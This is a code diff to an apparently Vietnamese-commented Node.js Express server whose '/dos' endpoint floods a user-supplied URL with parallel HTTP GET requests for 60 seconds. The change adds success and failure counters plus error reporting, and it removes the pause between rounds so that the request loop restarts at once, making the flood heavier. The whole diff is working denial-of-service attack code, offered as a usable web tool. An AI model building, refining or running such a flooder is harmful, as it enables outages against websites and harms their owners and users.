@@ -24,6 +24,9 @@ app.post('/dos', (req, res) => {
     }
 
     let isRunning = true;
+    let successfulRequests = 0;
+    let failedRequests = 0;
+    let errorMessages = [];
     const startTime = Date.now();
 
     // Khởi động các threads liên tục trong 60 giây
@@ -32,22 +35,30 @@ app.post('/dos', (req, res) => {
             const currentTime = Date.now();
             if (currentTime - startTime >= duration) {
                 isRunning = false;
-                return res.send('Quá trình tấn công đã kết thúc sau 60 giây.');
+                return res.send(`
+                    Quá trình tấn công đã kết thúc sau 60 giây.<br>
+                    Truy cập thành công: ${successfulRequests}<br>
+                    Truy cập thất bại: ${failedRequests}<br>
+                    ${errorMessages.length > 0 ? `Lỗi:<br>${errorMessages.join('<br>')}` : ''}
+                `);
             }
 
             const attackPromises = [];
             for (let i = 0; i < threads; i++) {
                 attackPromises.push(
                     axios.get(url)
+                        .then(() => {
+                            successfulRequests++;
+                        })
                         .catch((error) => {
-                            console.error(`Error making request to ${url}:`, error.message);
-                            return null; // Đảm bảo không có lỗi bị ném ra
+                            failedRequests++;
+                            errorMessages.push(`Error making request to ${url}: ${error.message}`);
                         })
                 );
             }
             Promise.all(attackPromises).then(() => {
-                // Gửi yêu cầu xong thì đợi 1 giây và gọi lại hàm này
-                setTimeout(startAttacks, 0); // 1000 ms = 1 giây
+                // Gửi yêu cầu xong thì gọi lại hàm này ngay lập tức
+                startAttacks();
             });
         }
     };
